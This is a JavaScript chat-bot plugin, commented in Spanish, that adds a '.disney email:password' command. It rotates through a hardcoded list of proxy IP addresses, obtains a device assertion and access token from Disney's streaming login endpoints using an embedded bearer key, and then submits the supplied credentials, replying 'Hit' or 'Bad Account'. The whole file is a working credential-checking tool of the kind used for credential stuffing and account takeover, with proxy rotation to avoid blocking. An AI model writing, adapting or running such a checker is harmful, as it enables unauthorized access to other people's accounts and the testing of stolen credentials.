import axios from 'axios';

const proxies = [
  'http://115.79.219.218:8181',
  'http://117.2.30.59:8181',
  'http://27.72.46.242:8181',
  'http://115.75.26.130:8181',
  'http://113.186.98.155:8181',
  'http://117.2.144.30:8181',
  'http://103.166.182.97:8080',
  'http://117.2.144.50:8181',
  'http://27.72.162.118:8181',
];

// Función para hacer la solicitud con proxy
const makeRequestWithProxy = async (url, headers, data, proxy) => {
  try {
    const response = await axios.post(url, data, {
      headers,
      proxy: {
        host: proxy.split(':')[0],
        port: proxy.split(':')[1],
      },
    });
    return response.data;
  } catch (error) {
    console.error(`Error con proxy ${proxy}:`, error.message);
    return null; // Retorna null si la solicitud falla con este proxy
  }
};

// Función para verificar las credenciales de Disney
const verifyDisneyCredentials = async (email, password) => {
  let assertion = null;
  let accessToken = null;
  const headers = {
    'content-type': 'application/json',
    'authorization': 'Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
  };

  // Intentar obtener assertion con proxies
  for (const proxy of proxies) {
    const deviceData = JSON.stringify({
      deviceFamily: "browser",
      applicationRuntime: "chrome",
      deviceProfile: "windows",
      attributes: {},
    });

    const deviceResponse = await makeRequestWithProxy('https://global.edge.bamgrid.com/devices', headers, deviceData, proxy);
    if (deviceResponse && deviceResponse.assertion) {
      assertion = deviceResponse.assertion;
      break;
    }
  }

  if (!assertion) {
    return 'Error al obtener assertion. Prueba con otro proxy.';
  }

  // Intentar obtener access token con proxies
  for (const proxy of proxies) {
    const tokenData = `grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token=${assertion}&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice`;
    const tokenResponse = await makeRequestWithProxy('https://global.edge.bamgrid.com/token', {
      ...headers,
      'content-type': 'application/x-www-form-urlencoded',
    }, tokenData, proxy);

    if (tokenResponse && tokenResponse.access_token) {
      accessToken = tokenResponse.access_token;
      break;
    }
  }

  if (!accessToken) {
    return 'Error al obtener access token. Prueba con otro proxy.';
  }

  // Intentar hacer login y verificar las credenciales
  for (const proxy of proxies) {
    const loginData = JSON.stringify({ email, password });
    const loginResponse = await makeRequestWithProxy('https://global.edge.bamgrid.com/idp/login', {
      ...headers,
      'authorization': `Bearer ${accessToken}`,
    }, loginData, proxy);

    if (loginResponse && loginResponse.id_token) {
      return `Hit: ${email}:${password}`;
    } else {
      return `Bad Account para ${email}`;
    }
  }

  return 'Error al verificar las credenciales. Prueba con otro proxy.';
};

let handler = async (m, { conn, command, text, args, usedPrefix }) => {
  if (command === 'disney') {
    const [email, password] = text.split(':');

    if (!email || !password) {
      return conn.reply(m.chat, 'Formato inválido. Usa el formato: `.disney email:password`', m);
    }

    try {
      const result = await verifyDisneyCredentials(email, password);
      conn.reply(m.chat, result, m); // Responder con el resultado: Hit o Bad
    } catch (error) {
      console.error('Error en la verificación:', error);
      conn.reply(m.chat, `Error al verificar las credenciales para ${email}. Intenta nuevamente más tarde.`, m);
    }
  }
};

// Establecer el comando
handler.command = ['disney'];

export default handler;
